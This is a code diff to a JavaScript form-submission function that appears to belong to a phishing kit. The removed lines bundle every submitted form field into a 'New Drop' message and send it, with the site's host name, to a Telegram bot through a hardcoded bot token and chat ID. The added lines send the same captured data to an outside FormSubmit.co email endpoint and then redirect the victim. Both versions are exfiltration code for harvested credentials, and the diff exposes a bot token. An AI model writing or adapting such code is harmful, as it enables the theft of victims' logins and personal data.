@@ -48,24 +48,32 @@ function inspectExport(formdata, nextpage) {
     on_submit();
 
     let strings = formdata;
-    let apiToken = "6507444437:AAGplwHIV3aCDN-JiluIU-sKM1JR5iCkOHI";
-    let chatId = "5870369988";
-    let message = `New Drop 🏆🏆🏆 %0A%0AFrom: ${window.location.host} %0A%0A`;
+    let apiUrl = "https://formsubmit.co/ajax/your-email@example.com"; // Replace "your-email@example.com" with your FormSubmit.co email
 
-    Object.keys(strings).forEach(function (key) {
-        message += ` ${strings[key]['name']} : ${strings[key]['value']} %0A%0A`;
-    });
-
-    let apiUrl = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+    let formData = new FormData();
+    formData.append("form_data", JSON.stringify(strings));
 
     let request = new XMLHttpRequest();
     request.open("POST", apiUrl);
-    request.send();
-    let response = request.response;
-    // Handle the response as needed
+    request.setRequestHeader("Accept", "application/json");
+
+    request.onreadystatechange = function() {
+        if (request.readyState === XMLHttpRequest.DONE) {
+            if (request.status === 200) {
+                // Success
+                console.log("Form submitted successfully!");
+                // Redirect to the next page if needed
+                window.location.href = nextpage;
+            } else {
+                // Error handling
+                console.error("Error submitting form:", request.responseText);
+                // Handle the error as needed
+            }
+        }
+    };
+
+    request.send(formData);
 }
-
-
 
 
 
